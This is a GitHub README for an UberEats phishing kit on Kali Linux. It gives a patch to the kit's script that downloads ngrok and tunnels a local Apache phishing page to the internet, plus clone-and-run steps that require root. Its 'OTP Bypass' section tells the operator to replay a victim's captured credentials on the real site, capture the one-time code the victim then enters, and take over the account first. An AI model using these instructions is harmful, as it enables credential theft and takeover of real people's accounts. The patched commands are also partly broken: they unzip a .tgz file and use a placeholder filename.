# UberEats-Phishing - Fixed (Kali linux)

Start from here (edit file "./Uber-eats.sh"):
https://github.com/pols1lver/uber-eats-phishing-fixed/blob/eb5812e3595ab0f4bf09adfac8c556f0ce40a37a/Uber-eats.sh#L62

Replace this (start from line 62):
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
chmod +x *
chmod 7777 *
sleep 6
echo""
gnome-terminal -x bash -c "./ngrok http 80; exec bash"

to this:
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
unzip ngrok-v3-stable-linux-amd64.tgz
tar zxvf fileNameHere.tgz
chmod +x *
chmod 777 *
gnome-terminal -x bash -c "./ngrok config add-authtoken <your_token_here>"
gnome-terminal -x bash -c "./ngrok http 80; exec bash"



This is UberEats-Phishing Tool with Bypass OTP ! UberEats

# OTP Bypass Instructions
When victim enter his credentials, you need to go to original website and use those credentials to send real OTP to victim. Once he enter that OTP such OTP will also be there with you and you will be allowed to login the account before him.

![uber](https://user-images.githubusercontent.com/55870659/76166045-e7e41e00-6131-11ea-9a03-e0cd446aea70.png)

![ub2](https://user-images.githubusercontent.com/55870659/76166048-ef0b2c00-6131-11ea-8494-9e0f72356c0d.png)

# Requirements
1. ngrok setup
2. Root - Must
3. Apache Server
4. Internet
5. add repo on kali

# How to Intsall & Use
root ---must !
1. git clone https://github.com/Ignitetch/UberEats-Phishing.git
2. cd UberEats-Phishing/
3. chmod 777 *
4. ./Uber-eats.sh 

# Contact For Contribute
sg5479845@gmail.com
